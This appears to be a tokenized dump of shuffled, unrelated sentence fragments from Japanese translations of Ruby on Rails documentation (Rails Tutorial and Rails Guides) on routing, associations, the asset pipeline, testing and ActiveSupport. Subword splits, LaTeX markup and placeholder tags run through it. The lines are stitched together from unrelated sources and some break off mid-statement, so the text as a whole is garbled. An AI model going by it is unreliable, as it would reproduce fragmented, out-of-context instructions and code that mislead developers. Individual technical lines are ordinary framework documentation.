▁### ▁ メソッドの 再 定義
▁config ▖ middleware ▖ use ▁M a g ical :: Uni c or n s
▁ここで 重要なのは 、 ハッシュの 波 かっこ は 、 ブロック の 波 かっこ とは まったく 別 物 である という 点 です
▁\ k ode { uglifier } のバージョン が \ k ode { 1 ▖ 3▖0 } 以上 であれば 最新 バージョンの gem が インストール されます ▟ 極 端 に 言 えば 、 バージョン が \ k ode { 7▖2 } であっても それが 最新 なら インストール されます ▁( なお 、 uglifier は Asset ▁Pipeline で ファイル 圧縮 を行う ためのものです ) 。
▁ そのような 名前 を 関連付け に使用する と 、 基 底 メソッドが 上書き されて 不 具 合 が生じ る可能性があります 。
▁` parent ` メソッドは 、 名前 が ネストした モジュール に対して 実行 でき 、 対応する 定数 を持つ モジュール を返します 。
▁too _ sh or t : ▁" % { count } 語 以上 必要です ",
▁$ ▁git ▁re base ▁ upstream / master
▁S e ar ch ed ▁in : ▁*
▁このメソッドは 、 パス を Ruby の クラス に変換 するときに も よく 使用されます ▟ スラッシュ で 区 切 ら れ ている パス は 「 :: 」 で 区 切 られます 。
▁ 今 はまだ この 解説 が 少し 抽 象 的に 思える かもしれませんが 、 この章 は 後に 何 度 も 参 照 する 事 になるので ご 安 心 ください 。
▁$ ▁git ▁fetch ▁ upstream
▁ Hash ▖ new ( middleware s )
▁ 明 ら か に 、 従来 の 書き 方 よりも 洗 練 されています ▟ しかし これは ほんの さ わ り です 。
▁\ href { https :// github ▖ com / rails / rails / blo b / master / active model / lib / active _ model / secure _ password ▖ rb } { secure _ password の ソースコード } を調べ てみると 、 以下のような 比 較 を 行 っている 箇所 があります
▁{0} 第 {1} 9 {/1} 章 {/0} では 、 基本的な Users リソース ▁( 表 \ ref { table : RESTful _ users } の 標準的な REST アクション をすべて 使用 ) ▁ と 、 自 由 道 の高い 認 証 ▁( authentication ) ▁ および 認可 ▁( authorization ) ▁ システム を作成し ました 。
▁{0}{1} 第 8 章 {/1}{/0} では 、\ ref { sec : adding _ a _ secure _ password } の 認証システム を利用して 、 ユーザーが 実際に Web サイトに ログイン できるようにします 。
▁| ▁PR IM A RY ▁| ▁4 ▁| ▁ const ▁| ▁1 ▁| ▁|
▁この場合 、` PATCH ` リクエスト も ` / users / : id ` 経由で ` update ` アクションに ルーティング されます 。
▁最後に 、 Ruby が 以下のような コードを 正常に 実行 でき ている のが 不思議 です 。
▁\ ref { sec : a _ users _ resource } で 、 アプリケーションの 振る舞い を理解する ために \ k ode { デバッグ情報 } が 役に立 つ ことを 学 び ました 。
▁ そのオブジェクト が ` middleware ` メソッド に応答する 場合 、 その ミドルウェア を ミドルウェアスタック の ` Rack :: Runtime ` の 前に 挿 入 します 。
▁ここまで は ハッシュの キー として 文字列 を使用して いました が 、 Rails では 文字列 よりも \ emph { シンボル } を使用する 方が 普通 です 。
▁ オプション の 引数 は ヘッダ 名 と 値を ペ ア にした ハッシュ 値 として 解 釈 されます 。
▁ 実際の ユ ー ス ケース で ハ ー ド コード された リスト で 十分 であること が わ か っている 場合には 、` duplicable ?` を お 使い ください 。
▁[ M p ac k ]( http :// p and al abs ▖ p and a security ▖ com / mp ac k - un c over ed / ) は 大 変 活 発 かつ 最新の 攻 撃 用 フレームワーク であり 、 これらの 脆弱性 を使用しています 。
▁\ emph { ヒント } : ▁\ k ode { picture } 属性 が 有効 かどうかを 確かめ る ときは 、\ ref { sec : activation _ test _ and _ refactoring } で紹介した \ k ode { assigns } メソッドを使って ください ▟ このメソッド を使うと 、 ▁ 投 稿 に 成功 した 後に \ k ode { create } アクション 内の マイクロポスト にアクセス するようになります 。
▁ ある アクションに 複数の 異なる テンプレート があると 、 Action ▁Mailer によって自動的に マルチ パ ート 形式 の メール が 送信されます 。
▁* ▁` reverse _ order `
▁| config / | アプリケーションの 設定ファイル ▁( ルーティング 、 データベース など ) ▁ が ここ に置かれ ます 。
▁* ▁ リクエスト の 処理 を開始 した ことを 、 ログ に 書き 出 します 。
▁このコードは リスト \ ref { code : micropost _ belongs _ to _ user _ spec } で使用されていました ▟ もうひとつ 、
▁まずは 、 新規 ユーザー登録 用の 統合テスト を生成する ところから始め ていきます ▟ コントローラ ー の慣習 である 「 リソース 名 は 複数形 」 に 因 んで 、 統合テスト の ファイル名 は \ k ode { users _ signup } とします 。
▁ 別の ページ ▁( Home ページ など ) ▁ に い った ん 移動 する
▁#### # ▁`: class _ name `
▁ ╼ include d ▁in ▁all ▁copie s ▁or ▁substan tial ▁ port ion s ▁of ▁the ▁ Software ▖
▁\ k ode { gravatar \_ for } ヘルパー を 組み 込 んだ 結果を リスト \ ref { code : gravatar _ for _ helper } に 示 しました 。
▁=> ▁#< Person ▁id : ▁nil , ▁name : ▁" John ▁Doe ", ▁created _ at : ▁nil , ▁updated _ at : ▁nil >
▁### ▁Access ing
▁### ▁Action ▁Dispatch を設定する
▁ いつものように マイグレーション を実行します 。
▁# ▁ 値が 重複 して いて も email を 更新 できる
▁` Gemfile ` を以下のように変更し ます 。
▁Sprockets が フィンガープリント を使用する 際に は 、 ファイル の内容を ハッシュ化 したものを ファイル名 ▁( 通常 は 末 尾 ) ▁ に追加します 。
▁| ▁POST ▁| ▁ / magazine s / : magazine _ id / ads ▁| ▁ ads # create ▁| ▁ ある 1 冊 の 雑 誌 用の 広 告 を 1 つ 作成する ▁|
▁たとえば 、\ k ode { include ?} メソッド ▁(\ ref { sec : array s _ and _ range s }) ▁ を使って フォローしているユーザー の 集合 を調べ て み たり 、 関連付け を通して オブジェクト を探し だ せる ようになります 。
▁ 先ほど 定義 した \ k ode { store _ location } メソッドを使って 、 早速 before フィルター の \ k ode { logged _ in _ user } を 修正 してみます ▁( リスト \ ref { code : add _ store _ location }) 。
▁\ ref { sec : hello _ world } では MVC を使用する お 試 し アプリケーションを ご 覧 に 入 れ ます ▟\ ref { sec : mvc _ in _ action } では 、 この toy アプリ を使って MVC の詳細 を 解説します 。
▁#< User ▁id : ▁3 , ▁name : ▁" Foo ", ▁email : ▁" foo @ bar ▖ com ", ▁created _ at : ▁"2013-03-11
▁# ▁=> ▁{" a " =>2}
▁ これはリスト \ ref { code : microposts _ create _ tests } で使用されていました 。
▁これにより 、 Firefox 、 C h r o me 、 Safari などの 他の ブラウザに 影 響 を与え ずに 、 IE のバージョン が 9 未 満 の 場合に \ emph { のみ } HTML 5 ▁ shim を インクルード する ことができる ため 、 非常に 好 都 合 です 。
▁ 既に お 気 付き の方 も い る と思います が 、 これまで 行 な っ てきた 、 レイアウト 上の リンク のルーティング テストは 、 その リンク が 実際に 正しい ページ へのリンク になっている かどうかを チェック していません 。
▁ 新規 のマイクロポスト が この 方法で 作成される 場合 、\ k ode { user _ id } は \ emph { 自動 的 } に 正しい 値 に設定されます 。
▁ 足 り ない テストは ない か 。
▁NOTE : ▁ _ ユーザーが 入力 した データを コマンドライン の オプション に使用する 場合は 十分 に 注意してください 。
▁``` n g in x
▁ フォーム 送信 が成功した 場合に 何らかの 表示 を 行いたい ものです 。
▁` author _ class ` で 保存 時に ` constantize ` が 必ず 呼び出される ように したい場合は 、` lib / blorgh ▖ rb ` の ` Blorgh ` モジュール 内部 の ` author _ class ` ゲ ッ ター メソッド をオーバーライドする だけで できます ▟ これにより 、 値 の 保存 時に 必ず ` constantize ` を呼び出し て から 結果 が返されます 。
▁ どちらの 場合 も 、 図 \ ref { fig : riding _ rails } のように ブラウザに Rails アプリケーション が表示されます 。
▁t ▖ prev _ quarter ▁# ▁=> ▁Mon , ▁ 08 ▁Feb ▁2010
▁ 筆者 なら 即 、 この時点で 上の メニュー を 記 述 する 統合テスト を書く でしょう 。
▁` Array # to _ param ` を実行すると 、` to _ param ` が 配列 内の 各 要素 に対して 実行 され 、 結果 が " / " で join されます 。
▁( 表 \ ref { table : RESTful _ users } の HTTP メソッドと REST アクション の 関連付けを 思い 出 しましょう ) 。
▁# ▁ bcrypt ' の コ スト 関数 を 下 げ ること で テストの 速 度 を 向上 させる 。
▁person ▁= ▁Person ▖ new ( name : ▁" John ▁Doe ")
▁# ▁Rails ▖ backtrace _ cleaner ▖ remove _ silencer s !
▁StaticPages コントローラ内の \ k ode { home } アクションと \ k ode { help } アクション で使用する ルーティング
▁`: join _ table ` オプション を使用して 明示的に 結合テーブル の名前 が指定されてい ない場合 、 Active ▁Record は 2 つの クラス名 を 辞書 の 並び順 に 連結 して 、 適 当 に 結合テーブル 名を こ し ら えます 。
▁` Rails :: Server ` クラスは ` Rack :: Server ` クラス を継承し ており 、 以下のように して ` Rack :: Server # start ` を呼び出します 。
▁ これはリスト \ ref { code : user _ show _ page _ test } で使用されていました 。
▁ 修正 された Home ページ
▁ 新しく 作成した エンジンの ルート ディレクトリ には 、` blorgh ▖ gem spec ` という ファイル が置かれます 。
▁ フレンドリーフォワーディング とは 、 ログイン 成功 時に 元 々 行 き た か った ページに 転 送 させる 機能 である
▁( この 理由 から 、 いくつかの 言語 ▁( 特に Perl ) ▁ では ハッシュ を \ emph { 連 想 配列 } と呼ぶ こともあります ) 。
▁ただし 、 エ ン コ ー ダ が 書き 直 された 際に 以下の 機能 が エ ン コ ー ダ から 削除 されました 。
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / string / start s _ end s _ with ▖ rb ` です 。
▁* ▁PostgreSQL : ▁[ U s ing ▁ EXPLAIN ]( http :// www ▖ postgresql ▖ org / docs / current / static / using - explain ▖ html )
▁\ k ode { belongs _ to } 関連付けを ▁Relationship モデル に追加する 。
▁customer =
▁このヘルパーは デフォルトでは 文字 単 位 で 長さ を チェック します が 、`: token ize r ` オプションを使用することで 他の 方法で 値を 区 分 することもできます 。
▁ 以前 と同じ 動作 に 戻 したい場合は 、` unscope d `、` unscope `、` re where ` 、 または ` except ` を使用して ` default _ scope ` の 条件 を明示的に 除 外 する必要があります 。
▁### ▁ EXPLAIN の 出力結果 を 解 釈 する
▁ 日付 を 移動 する 最も 一般的な 方法は ` advance ` メソッドを使用することで す 。
▁Support ed ▁options ▁are :
▁Ruby ▁API ▁ の オンライン マニュアル を見つけ て 、 Hash クラスの \ k ode { merge } メソッド について 読んで み てください 。
▁上のコード を使用する 際 は 、 test グループ 内で 自分の システム に 該当する 行 を 必ず コメント 解除 してください
▁### ▁Active ▁Support
▁この節では 、 テストを 自動化 する \ href { https :// github ▖ com / guard / guard } { Guard } という gem の使い方 を 紹介します 。
▁TIP : ▁ この手法は 、 HTML コードの ご く 小 規 模 な ス ニ ペ ッ ト を 出力 したい場合 に 便利です 。
▁# ▁< objects ▁type =" array ">
▁has _ many ▁: confirmed _ orders , ▁-> ▁ { ▁where ▁ confirmed : ▁true ▁ },
▁render ▁"/ path / to / rails / app / views / books / edit "
▁ 強制的に プッシュ を行う と 、 リモート ブランチ の コミット が 失われ る 危 険 性 があります ので 、 く れ ぐ れ も ご注意ください 。
▁Gemfile
▁ 同様に 、 サインイン 成功 をテストするために 以下 を使用できます 。
▁つまり 、` Book ` という モデル クラス がある場合 、 これ に対応する データベースの テーブル は 複数形 の ** books ** になります 。
▁* ▁ パーシャル を使用して ビューを DRY に する方法
▁ どちらの ビュー も 単 なる プレースホルダ になっています ▟ トップレベル の 見 出 し が \ k ode { h 1 } タグ の中に あり 、 関連する ファイル への 絶 対 パス が \ k ode { p } タグ の中に 書かれてい ます 。
▁Rails では 、\ emph { パーシャル ▁( partial )} ▁ と呼ばれる 機能 を使用して これを実現 することができます 。
▁# ▁=> ▁ 555-1234
▁ 統合テスト は 、 ブラウザ による ページ 間 の 遷 移 を 効率 的に シ ミ ュ レ ート する
▁上のコードによって以下 の HTML が生成されます 。
▁ キャッシュ を 読み 出 さ ずに データベースから 直接 読み 込 ま せ たい場合は 、` force _ reload ` の 引数に ` true ` を設定します 。
▁ 正しい ページ テンプレート が 描画 されている かどうか 確かめ る
▁24 , ▁ 25 , ▁2 6 , ▁ 27 , ▁28 , ▁29 , ▁30 , ▁31 , ▁ 32 , ▁3 3 , ▁ 34 , ▁3 5 , ▁ 36 , ▁ 37 , ▁ 38 , ▁3 9 , ▁40 , ▁4 1, ▁ 42,
▁< h 1> Article s </ h 1>
▁#### ▁text _ field
▁=> ▁1▖ ▖ 5
▁# ▁collection ▁has ▁not ▁been ▁loaded , ▁it ▁is ▁equivalent ▁to ▁( コレクション が 読み 込 まれ なかった場合 は )
▁ 参 考 : ▁\ href { https :// github ▖ com / mhartl / rails _ tutorial _ s ublime _ text } { Rails ▁Tutorial ▁S ublime ▁Text } { p 1 } にある 説明 に従って 設定 することもできます 。
▁\ k ode { name : string } や \ k ode { email : string } オプション の パラメータを 渡す ことによって 、 データベース で使用した い 2 つの 属性を Rails に 伝 えます ▟ このとき に 、 これらの 属性 の 型 情報 も一緒に 渡します ▁( この場合は \ k ode { string }) 。
▁リスト \ ref { code : micropost _ access _ control } の テストにパス するためには 、 少し アプリケーション 側 の コードを リファクタリング しておく必要があります 。
▁リスト \ ref { code : layout _ links _ test } では 、\ k ode { assert _ select } メソッドの 高度な オプション を使っています ▁( このメソッド 自体 は リスト \ ref { code : title _ tests } や リスト \ ref { code : contact _ page _ test } でも 登 場 しました ) 。
▁\ ref { sec : a _ hashed _ password } で 解説 した ように 、「 暗号化 されていない パスワード ▁( un encrypted ▁password )」 という 呼 び 方は 正しく ありません ▟ ここ で言う セキュア な パスワード とは 、 単 に \ emph { ハッシュ化 した } という 意味 であり 、 本格的な 暗号化 は 行われ ていない からです 。
▁self を省略した 結果を リスト \ ref { code : full _ title _ helper _ tests } に示します 。
▁### ▁Rails 環境 を作成する
▁ 同様に 、 " an ▁SQLite ▁database " のように すること 。
▁ 置き場所 は や は り ` / articles / new ` でしょう 。
▁ ソフトウェア の開発 は 、 繰 り か え し に 次 ぐ 繰り返し です ▟ 読み づ ら くなる まで コードを 書き 足 し 、 その コードを リファクタリング する 、 その 繰り返し です ▟ そして 、 より 簡潔 な コードを書く ために 、 本書 が 少し でも お 役に立 て ば と思います 。
▁TIP : ▁` rails ▁new ▁- h ` を実行すると 、 Rails アプリケーション ビルダ で 使用できる すべての コマンドライン オプションを 確 認 できます 。
▁### ▁ Class 属性
▁ 実に ク ー ル だ と思います が 、 い か が でしょうか 。
▁Active ▁Support では 、` Date ▖ current ` を定義し て 現在の タイムゾーン における 「 今 日 」 を 定 め ています 。
▁\ k ode { hello \_ app } ディレクトリ にある デフォルトの \ k ode { Gemfile } 。
▁` to _ sentence ` メソッドは 、 配列 を 変換 して 、 要素を 列 挙 する 英 文 に します 。
▁ 従来 の Rails 開発 の慣習 と 異なる 箇所 が 1 つ あります ▟ Microposts リソース への インターフェイス は 、 主 に Pro file ページ と Home ページの コントローラ を経由して 実行される ので 、 Microposts コントローラ には \ k ode { new } や \ k ode { edit } のような アクションは 不要 という ことになります ▟\ k ode { create } と \ k ode { destroy } があれば 十分です 。
▁\ href { http :// on line ▖ p ragmatic s tudio ▖ com /}{ P ragmatic ▁S tudio } : ▁M i k e ▁Clark と N ic o le ▁Clark が 教 鞭 を 執 っている オンライン の Rails クラス です 。
▁invoke ▁test _ unit
▁12345678▖ 05 ▖ to _ s (: delimited ) ▁# ▁=> ▁12,345,678 ▖ 05
▁Rails には フック 可能な 初期化 イベント が 5 つ あります ▟ 以下 に 紹 介 する これらの イベント は 、 実際に 実行される 順序 で 掲 載 しています 。
▁リスト \ ref { code : first _ create _ action } のコード の動作 を理解する もっと も よい 方法は 、 実際に 無効な ユーザー登録 データを \ emph { 送信 ▁( submit )} してみる ことです 。
▁\ k ode { dependent : ▁: destroy } という オプション を使うと 、 ユーザーが 削除され たときに 、 そのユーザー に 紐 付 いた ▁( その ユーザーが 投 稿 した ) ▁ マイクロポスト も一緒に 削除 される ようになります 。
▁belongs _ to ▁: image able , ▁ polymorphic : ▁true
▁> > ▁p ▖ save
▁` body ` パラメータ は Sprockets で 必要 となります 。
▁ 最後の コマンドで は 、\ k ode { static - pages } トピックブランチ を Bitbucket に プッシュ しています 。
▁add _ header ▁ Cache - Control ▁public ;
▁ 以下のコード は 、
▁validates ▁: age , ▁ numericality : ▁true , ▁on : ▁: update
▁#### ▁` reverse _ update `
▁2 番目の render は 、 描画 したい パーシャル テンプレート である ` comments / form ` を 単 純 に 定義 している だけです 。
▁リスト \ ref { code : respond _ to _ password _ digest } のとき
▁# ▁config ▖ assets ▖ manifest ▁= ▁ 該当する パス
▁これは 、 テストの パス に 失敗した 後に 、 他の 余分な テストが 実行 され ないようにする ためのものです ▁( R ed - Green - Refactor の サイクル を 早 め るため ) 。
▁# ▁My App / app / models / blorgh / article ▖ rb
▁* ▁` config ▖ action _ view ▖ default _ form _ builder ` は 、 Rails で デフォルト で使用する フォーム ビルダ ー を指定します 。
▁ 新しい ` secrets ▖ yml ` に 秘 密 鍵 を 保存 したい場合は 以下の 手順 を実行します 。
▁ ビュー そのもの は 1 ページ のコード ですが 、 サイトの データベースから 取り出し た 情報 を使用して 各 プロファイル の表示 を カスタマイズ します 。
▁# ▁# ▁=> ▁< label ▁for =" article _ title "> Title </ label >
▁def ▁ stringify _ keys
▁リスト \ ref { code : word _ class } では 、 単語 の 文字 を 逆 順に した もの が 元の 単語 と同じ である かどうか の チェック を 、\ k ode { Word } クラス の中から 自分自身 が 持つ 単語 にアクセス することで 行 な って いることにご注目ください 。
▁ カスタム ルール で 提供する リスト \ ref { code : following _ followers _ action s _ routes } の RESTful ルート
▁app
▁ 今 はまだ 何も ありません が 、 すぐに デプロイ して Web ページを 表示 させ ましょう 。
▁` Array ` が必要な場合は , ▁` where (▖▖▖) ▖ to _ a ` を使用してください 。
▁alias _ method ▁: origin al _ process , ▁: process
▁ 数 分 待 って から ページ を再度 読み込む と 、 この テキスト は自動的に 新しい 時間 に基づいて 更新 されます 。
▁ { code : demo _ length _ validation } ▁works ▁on ▁the ▁production ▁app ▖╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - de b cc 6 ' ></ span >╼ \ end { enumerate }╼╼ ▁\ section { 最後に } ▁% ▁( fold )╼ ▁\ label { sec : toy _ app _ co nclusion }╼╼
▁cookies は 今 から 20 年 後に 切 れる ▁(\ text tt { 20 ▖ years ▖ from _ now })
▁Action ▁Pack など 、 特定の コンポーネント のテスト のみ を実行する こともできます 。
▁上のように 変更 した ことで 、 新しい 記事 の作成 が よう や く できるようになりました 。
▁上の フォーム のコード では 、 `@ book ` インスタンス変数 が ` nil ` 場合に 問題が生じ る可能性があります 。
▁たとえば ルート URL を定義する と 、\ k ode { root _ path } や \ k ode { root _ url } といった メソッド を通して URL を参照 することができます ▟ ちなみに 前 者 は ルート URL 以下の 文字列を 、 後者は 完全な URL の 文字列 を返します 。
▁ リクエスト と リクエスト の 合 間 に 、 マニフェスト に記載されている ファイル のいずれか で 変更 が生じ た場合 、 Rails サーバー は 新しく コンパイル された ファイルを レスポンス で 返します 。
▁# ▁Person ▖ exists ?( ['
▁### ▁Active ▁Record フィクスチャ で 定義された メソッド
▁ ルーティング グ ロ ブ ▁( route ▁g lo b b ing ) ▁ とは ワ イ ル ド カ ー ド 展開 の こと であり 、 ルーティング のある 位 置 から 下 の すべての 部分 に 特定の パラメータを マッチ させる 際に 使用します 。
▁* ▁[ Ruby ▁on ▁Rails チュートリアル ]( http :// railstutorial ▖ jp )
▁` is _ missing ?` メソッドは 、 この 2 つの 場合 を 区別 するために使用されます 。
▁{0} 図 10 ▖ 17 {/0} {1} 2 番目 に 新しいマイクロポスト を削除し た 後 のユーザー Home ページ ▟\ href { http :// railstutorial ▖ org / images / figures / home _ post _ delete _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁\ label { fig : micropost _ image _ mockup } }╼\ end { figure }╼╼\ subsection { 基本的な 画像アップロード } ▁% ▁( fold )╼\ label { sec : basic _ image _ upload }╼╼
▁これにより 、 サインイン の状態 と 現在のユーザー id に応じて 動作を 変更 できるようになります 。
▁| ▁DELETE ▁| ▁ / magazine s / : magazine _ id / ads / : id ▁| ▁ ads # destroy ▁| ▁ ある 雑 誌 1 冊 に含まれる 広 告 を 1 つ 削除 する ▁|
▁root ▁to : ▁" home # index "
▁" "▖ html _ safe ▁+ ▁"< " ▁# ▁=> ▁" & lt ; "
▁#### ▁` has _ and _ belongs _ to _ many ` の オプション
▁You ' re ▁free ▁to ▁add
▁ ブロック フォーム を使用することで 、 多数の ルーティング に対して 1 つの 制限 を まとめて 与 え ることもできます 。
▁assemblies ▖ exists ? (▖▖▖)
▁To ▁get ▁help ▁on ▁this ▁sample ▁app , ▁see ▁the
▁ Array ▖ wrap ( [ 1, ▁2, ▁3] ) ▁# ▁=> ▁[1, ▁2, ▁3]
▁{0} Figure ▁4 ▖ 2 : ▁{/0}{1} The ▁inheritance ▁hierarchy ▁for ▁the ▁( n on - built - in ) ▁\ k ode { Word } ▁class ▁from ▁Listing ▁\ ref { code : word _ class } ▖ {/1}
▁\ k ode { rake ▁test } はデフォルトで 、 テストの 失敗 を 赤色 で 表示 します が 、 テストが パス しても 緑色 で 表示 しません 。
▁# ▁また Lifo :: Cache に { ▁page _ cache : ▁false ▁ } を 渡す
▁` subclasses ` メソッドは レシーバの サブクラス を返します 。
▁Rails を デフォルトで セキュア に するために 、` deep _ munge ` メソッドは 一部の 値を ` nil ` に置き換え ます 。
▁ 実際 、 上の ように 書 いて も 動作します ▟ しかし 、\ ref { sec : exercises _ layout _ link _ tests } で 簡単に触れ た ように 、 アサーション \ k ode { assert _ equal } の 引数 は 、\ emph { 期 待 する 値 }、\ emph { 実際の 値 } の順序 で 書く のが ルール になっています 。
▁ 「 チュートリアル を 2 回 通 して 行う 」 という 方法 も お勧め です ▟ 続けて もう一度 や っ てみると 、1 回 目 のとき よりも ずっと 知識 が 身 に 付 いた ことを 実 感 できます し 、2 度 目 には もっと 短い 時間 で 終 え られる でしょう 。
▁1 つの メールを 複数の 相手 に 送信する ことも もちろん 可能です ▁( サインアップ が 新規 に 行われた ことを 全 管理者 に 通知 する など )▟ これを行なうには 、 メールの リスト を `: to ` キー に設定し ます 。
▁ ログイン の しく み がない
▁ ところで 、 この \ k ode { authenticated ?} メソッド ▁( リスト \ ref { code : authenticated _ p }) ▁ は 記憶ダイジェスト と 強く 結 び つ い ています が 、 実は 他の 様々な 用 途 にも 応用 できます ▟ {3} 第 {2} 10 {/2} 章 {/3} では この メソッドを 一 般 化 してみます 。
▁* = ▁require _ self
▁ 簡単な Cucumber の シナリオ をいくつか 紹 介 した ので 、 それら と 同等の RSpec の例 と 比 較 してみましょう 。
▁第 \ ref { cha : sign _ up } 章では 、 HTTP ▁\ text tt { POST } リクエストを Users コントローラの \ k ode { create } アクションに 発行する HTML フォーム を作成する ことで 、 ユーザーの サインアップ を実装 しました 。
▁ 以下を実行して テストスイート が パス する ことを確認 してから先に進 む ことにしましょう 。
▁ そして 、 Ruby ▁( および C 、 C + + 、 Perl 、 P y th on 、 Java などの 多くの プログラミング言語 ) ▁ では 、 上の 演 算 を 以下のような 短縮 形で 表 記 することもできます 。
▁ 一般的な ORM アプリケーションでは 特に この 傾 向 があります 。
▁* ▁` config ▖ exception s _ app ` は 、 例外 が発生し たときに Show E xception ミドルウェア によって 呼び出される アプリケーション 例外 を設定します 。
▁ 日時 に関連する コンポーネント ( ` Time `、` DateTime `、` ActiveSupport :: Time With Z one ` ) を持つ オブジェクトに対して ` # as _ json ` を実行すると 、 デフォルトで ミ リ 秒 単 位 の 精 度 で 値が 返される ようになりました 。
▁* ▁ アプリケーション 開 始 時に 実行 したい コード を追加する 方法
▁#### # ▁` years _ ago `、` years _ since `
▁この 例 の場合 、 `@ customer ▖ confirmed _ orders ▖ create ` または `@ customer ▖ confirmed _ orders ▖ build ` を実行すると 、 confirmed カラム の 値が ` true ` の 注文 ( order ) が 常に 作成されます 。
▁#### ▁ 必要な 定義 だけ を 選 ぶ
▁* ▁` config ▖ action _ view ▖ cache _ template _ load ing ` は 、 リクエスト の たびに ビューテンプレート を再読み込みする か ( = キャッシュ しない か ) を指定します 。
▁ 本書 における 主要な テストは 、\ emph { コントローラ テスト } ▁( この節 より ) 、\ emph { モデル テスト } ▁( 第 \ ref { cha : modeling _ users } 章 より ) 、\ emph { 統合テスト } ▁( 第 \ ref { cha : sign _ up } 章 より ) ▁ の 3 つ です 。
▁このオプション では `: yui ` という 一 風 変 わ った オプション を指定できます ▟ これは ` yui - compressor ` ▁gem の ことです 。
▁### ▁config / environments / development ▖ rb
▁ メールアドレス の 一意性 を強制する ための マイグレーション
▁ システム の状態 によって は 、 一部の コマンドを実行 した 時に エラー が発生する こともあります ▟ 本書 では 、 あらゆる 場合 を 想 定 して エラー 対策 を 事 細 か に 記載 する ような \ href { http :// en ▖ w ikipedia ▖ org / wiki / S is y ph us } { 報 わ れ ること の ない 苦 労 } を 背 負 い 込 む ことは や め ました ▟ 代わりに 、 エラーメッセージ を 素 直 に Google で 検索 してください ▟ これは 実際の ソフトウェア 開発 において も 効果 的な テクニック です 。
▁has _ and _ belongs _ to _ many ▁: part s
▁` app / views / articles / new ▖ html ▖ erb ` を エディタ で 開 き 、` form _ for ` の 行 を以下のように変更し ます 。
▁1▖ object _ id ▁# ▁=> ▁3
▁ モデルの 継 承 関係 と同様に 、 Users コントローラ も Microposts コントローラ も 最終的に は \ k ode { ActionController :: Base } を継承し ており 、 モデルオブジェクト の 操作 、 イン バ ウ ンド HTTP ▁request の フィルタ 、 ビューを HTML として 出力する などの 多 彩 な 機能を 実行 できる ようになっています ▟ ▁S ince ▁all ▁Rails ▁controllers ▁inherit ▁from ▁{1} Application Controller {/1} , ▁rules ▁defined ▁in ▁the ▁Application ▁controller ▁automatically ▁apply ▁to ▁every ▁action ▁in ▁the ▁application ▖
▁` through : ▁: section s ` と 指定 する ことにより 、 Rails は 以下の 文 を 理解 できるようになります 。
▁c 1 ▁= ▁Client ▖ find (1)
▁次に 、 結果 の最初の ページに 正しい ユーザー が表示されている ことを確認します 。
▁リスト \ ref { code : hello _ action } に 、\ k ode { hello } を定義し た ところ を示します ▟ ここでは \ k ode { render } 関数 で 「 hello , ▁world !」 という テキスト を表示し ています 。
▁#### ▁` title ize `
▁ アプリケーションの プ リ ロー ダ ー として Spring を使用する場合 は 、 以下 を行う 必要があります 。
▁` app / views / books / index ▖ html ▖ erb ` ビュー ファイル の内容 が 以下のように な っている とします 。
▁ 本番 Web サイト で SSL を使用する ように 設定 を行う のは かなり 面倒 で 、 間 違い も 起 き や す く なっています ▟ また 、 使用する 独自 ドメイン 向 け の \ emph { SSL 証 明 書 } も 購 入 し なければなりません 。
▁ これはリスト \ ref { code : before _ create _ remember _ token } で使用されていました 。
▁# ▁Blorgh / lib / con c er n s / models / article
▁ これはリスト \ ref { code : signup _ form } で使用されていました 。
▁ 関連付け は 、 一種の マクロ 的な 呼び出し として 実装 されており 、 これによって モデル 間 の 関連付けを 宣言 的に 追加 することができます 。
▁上のコード が 動作 するために必要な � パスワード 再設定 用 メイラー メソッドは 、\ ref { sec : account _ activation _ email s } で開発した アカウント有効化 用 メイラー メソッドと ほぼ 同じです 。
▁| ▁` Mo use ` ▁| ▁` m ice ` ▁|
▁I ▁shall ▁be ▁late !" ▖ truncate _ words ( 4 , ▁omission : ▁' & hell ip ; ')
▁d ▖ prev _ week (: f ri day ) ▁# ▁=> ▁Fri , ▁30 ▁Apr ▁2010
▁` truncate _ words ` メソッドは 、 指定された ワ ー ド 数 から 後 ろ を き り お と した レシーバの コピー を返します 。
▁\ ref { sec : basic _ image _ upload } の アップ ロー ダ ー も 悪 く はありません が 、 いくつかの 目 立 つ 欠 点 があります 。
▁ マニフェスト 名 は Rails ヘルパー によって これらの フィンガープリント 名 と 置き換え ら れ て 使用されます 。
▁( ハッシュ化 という と 少し 困 惑 してしまう かもしれません 。
▁これらの メソッド のうち 、` association ` の 部分 は プレースホルダ であり 、` belongs _ to ` の最初の 引数 である 関連付け 名を シンボル にした もの に置き換えられます 。
▁stylesheet _ url ▁" application " ▁# ▁=> ▁ http :// www ▖ example ▖ com / assets / application ▖ css
▁has _ many ▁: books
▁リスト \ ref { code : account _ activation _ email } のとおり に メール が 生成 でき たら 、 今度は Account Activations コントローラの \ k ode { edit } アクション を書いて 、 実際に ユーザーを 有効化 できるように する必要があります 。
▁do ▁| admin |
▁* ▁** 主キー ** ▁- ▁デフォルトでは ▁` id ` ▁という 名前を持つ integer の カラム を テーブルの 主キー として 使用します 。
▁ここでは 、\ k ode { User ▖ find } に ユーザーの id を渡して います ▟ その 結果 、 Active ▁Record はその id のユーザー を返します 。
▁\ k ode { name : string } と \ k ode { email : string } オプション を追加する ことで 、 User モデル の内容 が 図 \ ref { fig : demo _ user _ model } の 表 のとおり になるように します
▁Sprockets は 、` must - re validate ` という Cache - Control ▁HTTP ヘッダ を設定する ことで 、 以後 の リクエスト の オ ー バー ヘ ッ ド を 減 ら します ▟ この場合 、 ブラウザは レスポンス 3 04 ▁( Not ▁ Mo d if i ed ) ▁ を受け取り ます 。
▁以下は Action ▁Controller の ` set _ helpers _ path ` イニシャライザ から 取 った 例 です 。
▁development モード の場合 、 あるいは アセットパイプライン が 無効 になっている 場合は 、 これらの アセット への リクエスト は ` coffee - script ` ▁gem と ` sass ` ▁gem が提供する プロ セ ッ サ によって 処理 され 、 それぞれ JavaScript と CSS として ブラウザ への レスポンス が 送信されます 。
▁ アプリケーション 全体 で 特定の レイアウト を使用したい場合 は 、` Application Controller ` クラス で ` layout ` を 宣言 します 。
▁ RVM の詳細については 、 「\ href { http :// str and code ▖ com / 2013 / 07 / 11 / ruby - version - manager - rvm - overview - for - rails - new b s /}{ Rails 初心者 のための Ruby ▁ Version ▁Manager ▁( RVM ) ▁ の概要 } ▁( 英語 )」 という 記事 を 参考にしてください
